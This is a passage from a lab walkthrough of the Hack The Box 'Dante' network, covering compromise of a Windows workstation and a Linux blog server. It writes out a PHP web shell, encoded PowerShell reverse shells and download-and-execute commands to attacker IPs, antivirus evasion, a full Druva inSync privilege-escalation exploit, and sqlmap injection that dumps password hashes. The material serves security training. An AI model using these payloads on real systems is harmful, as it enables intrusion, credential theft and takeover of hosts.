SMB         172.16.1.13     445    DANTE-WS01       [*] Windows 10 / Server 2019 Build 18362 (name:DANTE-WS01) (domain:DANTE-WS01) (signing:False) (SMBv1:False)
SMB         172.16.1.13     445    DANTE-WS01       [-] DANTE-WS01\: STATUS_ACCESS_DENIED 
SMB         172.16.1.13     445    DANTE-WS01       [-] Error enumerating shares: Error while reading from remote

```

Let’s visit the webpage:

![image.png]({{ site.baseurl }}/assets/dante/image%2036.png)

Let’s fuzz:

```bash
feroxbuster -u http://172.16.1.13 -C 404

http://172.16.1.13/discuss/
```

### Foothold WS01

Let’s visit the /discuss subdir

![image.png]({{ site.baseurl }}/assets/dante/image%2037.png)

Let’s try default login admin:admin to sign in:

![image.png]({{ site.baseurl }}/assets/dante/image%2038.png)

We are in.

In messages, there is a search function:

![image.png]({{ site.baseurl }}/assets/dante/image%2039.png)

![image.png]({{ site.baseurl }}/assets/dante/image%2040.png)

Let’s fuzz for php files:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://172.16.1.13/discuss/admin/FUZZ -ic -e .php

search.php              [Status: 302, Size: 4282, Words: 1100, Lines: 105, Duration: 49ms]
home.php                [Status: 302, Size: 3832, Words: 1039, Lines: 85, Duration: 35ms]
header.php              [Status: 200, Size: 2790, Words: 731, Lines: 59, Duration: 18ms]
Home.php                [Status: 302, Size: 3832, Words: 1039, Lines: 85, Duration: 19ms]
footer.php              [Status: 200, Size: 778, Words: 299, Lines: 19, Duration: 33ms]
Search.php              [Status: 302, Size: 4282, Words: 1100, Lines: 105, Duration: 31ms]
topic.php               [Status: 302, Size: 4020, Words: 1046, Lines: 87, Duration: 2080ms]
logout.php              [Status: 200, Size: 3675, Words: 1040, Lines: 81, Duration: 132ms]
message.php             [Status: 302, Size: 4368, Words: 1062, Lines: 107, Duration: 2919ms]
messages.php            [Status: 302, Size: 3889, Words: 1042, Lines: 89, Duration: 4839ms]
utility.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
```

Nothing too interesting. 

Searching technical discussion forum exploit, we find this RCE

https://www.exploit-db.com/exploits/48512

It just uploads a web shell for user image upload.

We can exploit this from an unauthenticated user signing up. Let’s upload the image by modifying our settings:

```bash
<?php
$command = shell_exec($_REQUEST['cmd']);
echo $command;
?>
```

![image.png]({{ site.baseurl }}/assets/dante/image%2041.png)

Now let’s visit where our uploaded webshell should be:

```bash
After the registration process is completed go to the following page and execute the os command via uploaded shell
http://localhost/Online%20Discussion%20Forum%20Site/ups/shell.php?cmd=$THECODE-YOU-WANT-TO-EXECUTE

```

Let’s check in the ups dir:

```bash
http://172.16.1.13/discuss/ups/
```

We see our web.php:

![image.png]({{ site.baseurl }}/assets/dante/image%2042.png)

Now let’s see our webshell works:

```bash
http://172.16.1.13/discuss/ups/web.php?cmd=whoami
```

![image.png]({{ site.baseurl }}/assets/dante/image%2043.png)

We are on. Let’s get a reverse shell back.

Let’s use nishang’s TCP one-liner. First, change the IP to our NIX01.

Make sure there is a listener on our proxy server session:

```bash
listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444
```

Now the IP we want to connect to:

```bash
172.16.1.100
```

![image.png]({{ site.baseurl }}/assets/dante/image%2044.png)

Now encode it in b64 and little endian format:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA3ADIALgAxADYALgAxAC4AMQAwADAAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==
```

Now the whole command on our request:

```bash
cmd=powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA3ADIALgAxADYALgAxAC4AMQAwADAAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==

cat test.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA3ADIALgAxADYALgAxAC4AMQAwADAAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==

```

And URL encode it:

![image.png]({{ site.baseurl }}/assets/dante/image%2045.png)

Now start a listener:

```bash
nc -lnvp 4444
```

Did not work. 

Let’s view the error, add the following to the end of the line so we can debug the error:

```bash
2>&1
```

Whole command:

```bash
powershell+-enc+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA3ADIALgAxADYALgAxAC4AMQAwADAAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA%2bACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA%3d%3d+2>%261
```

![image.png]({{ site.baseurl }}/assets/dante/image%2046.png)

We were blocked by anti-virus. Let’s upload nc.exe.

```bash
powershell iwr http://172.16.1.100:8006/nc.exe -OutFile nc5.exe 2>&1

powershell IEX(New-Object Net.WebClient).downloadString('172.16.1.100:8001/nc.exe')

powershell (New-Object Net.WebClient).DownloadFile('http://172.16.1.100:8001/temp.ps1','temp.ps1')
```

More problem arose. We got a protocol violation. 

![image.png]({{ site.baseurl }}/assets/dante/image%2047.png)

ligolo-ng proxy is doing something to the packet when we are sending our requests. Let’s just upload the file to NIX01, and use that to send files.

Now we execute the following, and we see our files in the /ups dir:

```bash
#on nix01
python3 -m http.server 8002

#on our webshell
powershell iwr http://172.16.1.100:8002/nc.exe -OutFile nc.exe 2>&1
```

![image.png]({{ site.baseurl }}/assets/dante/image%2048.png)

![image.png]({{ site.baseurl }}/assets/dante/image%2049.png)

Now let’s get a shell back:

```bash
.\nc.exe -e cmd.exe 172.16.1.100 4444

```

We get error cannot execute program. 

Let’s try conpty shell. 

Another method to bypass anti-virus is to change the keywords in our reverse shell. Let’s use conpty shell. 

First change Invoke-ConPtyShell and ConPtyShell to another keyword, in our case, we changed it to billy. Also, delete all comments in the file so we don’t get flagged up by AV. Now, add the following at the end of the file so it will execute after download:

```bash

billy 10.10.16.3 3001
```

Now start our listener:

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Now our downloadString:

```bash
powershell IEX(New-Object Net.WebClient).downloadString('http://172.16.1.100:8002/temp.ps1')
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3:8001/temp.ps1') 2>&1

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3:8001/temp.ps1')

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3:8001/temp.ps1'
) 2>&1

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3:8001/temp.ps1') 2>&1
```

![image.png]({{ site.baseurl }}/assets/dante/image%2050.png)

We now have shell:

![image.png]({{ site.baseurl }}/assets/dante/image%2051.png)

### Privilege Escalation WS01

Let’s check our privileges:

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

```

Nothing too interesting.

Let’s go to our home Desktop

```bash
cd C:\Users\gerald\Desktop

dir

Mode                LastWriteTime         Length Name                                                                                         
----                -------------         ------ ----                                                                                         
-a----       08/01/2021     04:39             31 flag.txt                                                                                     
-a----       13/07/2020     10:28           1417 Microsoft Edge.lnk 
```

Enumerating the machine, we find an unusual folder in Program Files x86:

```bash
cd "C:\Program Files (x86)\Druva\insync"

type license.txt

Druva InSync 6.6.3
Copyright (c) 2019 Druva Inc.
```

Searching up the version and exploit, we find this: https://nvd.nist.gov/vuln/detail/CVE-2020-5752

![image.png]({{ site.baseurl }}/assets/dante/image%2052.png)

The exploit is here: 

https://packetstorm.news/files/id/157802

It is a python exploit. On WS01’s C:\ dir, we see a python27 directory, with python.exe installed. Let’s upload the exploit and execute it, creating a new administrator account.

```bash
# Example usage:
#python insync.py "windows\system32\cmd.exe /C net user Leon /add"
#python insync.py "windows\system32\cmd.exe /C net localgroup Administrators Leon /add"

import socket
import struct
import sys

if len(sys.argv) < 2:
    print "Usage: " + __file__ + " <quoted command to execute>"
    print "E.g. " + __file__ + " \"net user /add tenable\""
    sys.exit(0)

ip = '127.0.0.1'
port = 6064
command_line = 'C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\..\\..\\..\\..\\..\\' + sys.argv[1] 

def make_wide(str):
    new_str = ''
    for c in str:
        new_str += c
        new_str += '\x00'
    return new_str

hello = "inSync PHC RPCW[v0002]"

func_num = "\x05\x00\x00\x00"                                   # 05 is to run a command, passed as an agrument to CreateProcessW
command_line = make_wide(command_line)                          # converts ascii to UTF-8
command_length = struct.pack('<i', len(command_line))           # packed as little-endian integer
requests = [ hello, func_num, command_length, command_line ]    # sends each request separately

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

i = 1
for req in requests:
    print 'Sending request' + str(i)
    sock.send(req)
    i += 1

sock.close()

print "Done."
```

Upload:

```bash
wget http://10.10.16.3:8002/druva.py
```

Let’s try executing the command:

```bash
C:\python27\python.exe druva.py 

Usage: druva.py <quoted command to execute>
E.g. druva.py "net user /add tenable"

```

Let’s execute:

```bash
C:\python27\python.exe .\druva.py "windows\system32\cmd.exe /C net localgroup Administrators gerald /add"

Sending request1
Sending request2
Sending request3
Sending request4
Done.

C:\python27\python.exe .\druva.py "windows\system32\cmd.exe /C net localgroup Administrators DefaultAccount /add"
```

Now check our group membership:

```bash
net user gerald

User name                    gerald
<SNIP>

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

However, due to UAC, we cannot access administrator directory.

```bash
dir C:\Users\Administrator

dir : Access to the path 'C:\Users\Administrator' is denied.                                                                                   
At line:1 char:1                                                                                                                               
+ dir                                                                                                                                          
+ ~~~                                                                                                                                          
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException                   
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Let’s use the exploit to send another reverse shell.

```bash
C:\Python27\python.exe .\druva.py "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3:8001/temp.ps1')"
```

Did not work, probably because it’s trying to execute powershell. Let’s try another way.

First, we have to upload nc.exe:

```bash
C:\Python27\python.exe .\druva.py "windows\system32\cmd.exe /C C:\Users\programdata\new.exe 10.10.16.3 4444 -e cmd.exe"
```

Doe not work. Let’s try powershell one-liner:

```bash
C:\Python27\python.exe .\druva.py "windows\system32\cmd.exe /C powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AMwAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA"
```

Blocked by anti-virus. Let’s put the PowerShell command in a file. e.g. run.bat

```bash
C:\Python27\python.exe .\druva.py "windows\system32\cmd.exe /C C:\programdata\run.bat"

```

Does not work. 

Let’s search for a python reverse shell script and execute it in python. We find this:

https://stackoverflow.com/questions/37991717/python-windows-reverse-shell-one-liner

```bash
C:\Python27\python.exe .\druva.py "windows\system32\cmd.exe /C C:\Python27\python.exe C:\programdata\rev.py"

#listener started before this
```

![image.png]({{ site.baseurl }}/assets/dante/image%2053.png)

We now have SYSTEM shell. 

## 172.16.1.12 DANTE-NIX04

```bash
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
MAC Address: 00:50:56:94:E0:3B (Unknown)
```

After ligolo tunnel set up, let’s rescan the ports so we have more information:

```bash
sudo nmap -sC -sV -oN 172.16.1.12 -p 21,22,80,443,3306 172.16.1.12

21/tcp   open  ftp      ProFTPD
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 22:cc:a3:e8:7d:d5:65:6d:9d:ea:17:d1:d9:1b:32:cb (RSA)
|   256 04:fb:b6:1a:db:95:46:b7:22:13:61:24:76:80:1e:b8 (ECDSA)
|_  256 ae:c4:55:67:6e:be:ba:65:54:a3:c3:fc:08:29:24:0e (ED25519)
80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
| http-title: Welcome to XAMPP
|_Requested resource was http://172.16.1.12/dashboard/
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://172.16.1.12/dashboard/
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_http-server-header: Apache/2.4.43 (Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3
3306/tcp open  mysql    MariaDB 10.3.24 or later (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Let’s see if anon is allowed on ftp:

```bash
ftp 172.16.1.12 
```

Denied.

Let’s visit the web page:

```bash
http://172.16.1.12 
```

![image.png]({{ site.baseurl }}/assets/dante/image%2054.png)

We click on phpMyAdmin:

![image.png]({{ site.baseurl }}/assets/dante/image%2055.png)

Let’s fuzz for subdir:

```bash
feroxbuster -u http://172.16.1.12 -C 404

blog
webalizer
```

![image.png]({{ site.baseurl }}/assets/dante/image%2056.png)

![image.png]({{ site.baseurl }}/assets/dante/image%2057.png)

Sign in page:

![image.png]({{ site.baseurl }}/assets/dante/image%2058.png)

Let’s try default credentials admin:admin:

![image.png]({{ site.baseurl }}/assets/dante/image%2059.png)

We are on.

![image.png]({{ site.baseurl }}/assets/dante/image%2060.png)

### Foothold DANTE-NIX04

Searching for blog admin ser bermz:

![image.png]({{ site.baseurl }}/assets/dante/image%2061.png)

https://www.exploit-db.com/exploits/48615

Checking the vendor home page, the images do look like the same admin panel we have:

[https://www.sourcecodester.com/php/14194/responsive-online-blog-website-using-phpmysql.html](https://www.sourcecodester.com/php/14194/responsive-online-blog-website-using-phpmysql.html)

![image.png]({{ site.baseurl }}/assets/dante/image%2062.png)

Let’s try out the exploit:

```bash
http://172.16.1.12/blog/category.php?id=1%27
```

![image.png]({{ site.baseurl }}/assets/dante/image%2063.png)

Let’s use sqlmap:

```bash
sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs --batch

**[11:06:05] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
<SNIP>**

available databases [7]:                                                                                                                      
[*] blog_admin_db
[*] flag
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

```

Let’s enumerate:

```bash
sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch -D flag --tables

[1 table]
+------+
| flag |
+------+

sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch -D flag -T flag --dump

+------------------------------+
| flag                         |
+------------------------------+
| DANTE{wHy_y0U_n0_s3cURe?!?!} |
+------------------------------+

sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch -D phpmyadmin --tables

+------------------------+
| pma__bookmark          |
| pma__central_columns   |
| pma__column_info       |
| pma__designer_settings |
| pma__export_templates  |
| pma__favorite          |
| pma__history           |
| pma__navigationhiding  |
| pma__pdf_pages         |
| pma__recent            |
| pma__relation          |
| pma__savedsearches     |
| pma__table_coords      |
| pma__table_info        |
| pma__table_uiprefs     |
| pma__tracking          |
| pma__userconfig        |
| pma__usergroups        |
| pma__users             |
+------------------------+

sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch -D phpmyadmin -T pma__users --dump

<EMPTY>

sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch -D test --tables

<EMPTY>

sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch -D blog_admin_db --tables

+-----------------------------+                                        
| banner_posts                |                                        
| blog_categories             |                                        
| blogs                       |                                        
| editors_choice              |                                        
| links                       |                                        
| membership_grouppermissions |                                        
| membership_groups           |
| membership_userpermissions  |
| membership_userrecords      |
| membership_users            |
| page_hits                   |
| titles                      |
| visitor_info                |
+-----------------------------+

sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch -D blog_admin_db -T membership_users --dump
```

![image.png]({{ site.baseurl }}/assets/dante/image%2064.png)

```bash
admin:21232f297a57a5a743894a0e4a801fc3
ben:442179ad1de9c25593cabf625c0badb7
egre55:d6501933a2e0ea1f497b87473051417f
guest:NULL
hacker:161ebd7d45089b3446ee4e0d86dbcf92
```

Let’s check what user we are:

```bash
sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch --privilege
```

![image.png]({{ site.baseurl }}/assets/dante/image%2065.png)

We seem to be root. Let’s get a shell and confirm:

```bash
sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch  --os-shell

sqlmap 'http://172.16.1.12/blog/category.php?id=1' --os-shell --technique=E
```

Did not work. Let’s decode the hashes on crackstation.

![image.png]({{ site.baseurl }}/assets/dante/image%2066.png)

Let’s see if we can logon with ben:

```bash
ssh ben@172.16.1.12

ben:Welcometomyblog
```

![image.png]({{ site.baseurl }}/assets/dante/image%2067.png)

We have ssh access.

### Prvilege Escalation DANTE-NIX04

Let’s eneumerate:

```bash
sudo -l

User ben may run the following commands on DANTE-NIX04:
    (ALL, !root) /bin/bash
```

We can run any command as any user, except for root.

In the Downloads dir, we find sudo:

```bash
ls -al
total 3228
drwxr-xr-x  3 ben ben    4096 Apr 14  2021 .
drwxr-xr-x 16 ben ben    4096 Nov  3 19:24 ..
drwxr-xr-x 11 ben ben    4096 Apr 14  2021 sudo-1.8.27
-rw-rw-r--  1 ben ben 3293178 Jun 26  2020 sudo-1.8.27.tar.gz

```

Let’s enumerate other users on this machine.

```bash
ls /home

cd julian

sudo -u julian /bin/bash
```

![image.png]({{ site.baseurl }}/assets/dante/image%2068.png)

Now let’s check our bash_history:

```bash
cd /etc/netplan/
ls
cat 01-network-manager-all.yaml 
